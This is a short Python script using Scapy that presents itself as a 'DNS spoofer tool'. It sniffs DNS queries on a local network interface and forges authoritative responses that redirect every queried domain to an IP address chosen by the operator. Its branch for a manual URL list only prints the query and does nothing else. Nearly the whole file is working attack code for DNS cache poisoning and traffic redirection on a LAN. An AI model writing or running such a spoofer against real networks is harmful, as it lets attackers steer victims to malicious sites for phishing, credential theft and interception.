from scapy.all import *

#initial testing
#dns_req = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='www.symbolab.com'))
#answer = sr1(dns_req)
#print(answer[DNS].summary())

#method which does the DNS spoofing of a packet
def dosomething(packet):
    print("I got one!! ")
    if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
        print("DNS packet found")
        #Case the user entered websites to redirect himself
        if(len(url) > 0):
            print("case we entered some shit ourselves")
            print(packet[DNS].qd.qname)
        #Case all ULRs should be redirected
        else:
            print("case when everything should be redirected")
            spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
            spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
            spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
            spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=ip_website)
            spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
            #send the packet
            sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=interface)
            print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, ip_website))
       
    
print("--=====-- DNS spoofer tool --=====--")

#get interface to use
available_interfaces = get_if_list()
print(available_interfaces)
interface = raw_input("Select the interface that you want to use: ")

ip_website = raw_input("enter the ip address to where the user should be redirected: ")

input_choice = raw_input("do you want to selects URLs to redirect manually? (y/n): ")
#url contains all urls to redirect to the ip address specified above
url = []
if (input_choice == "y"):
    input = ""
    while(input != "quit"):
        input = raw_input("Enter a URL which should be redirected: (quit to stop entering) ")
        if(input != "quit"):
            url.append(input)

print("DNS sniffing has started")
while True:
    sniff(filter="port 53", prn=lambda packet: dosomething(packet), iface=interface)
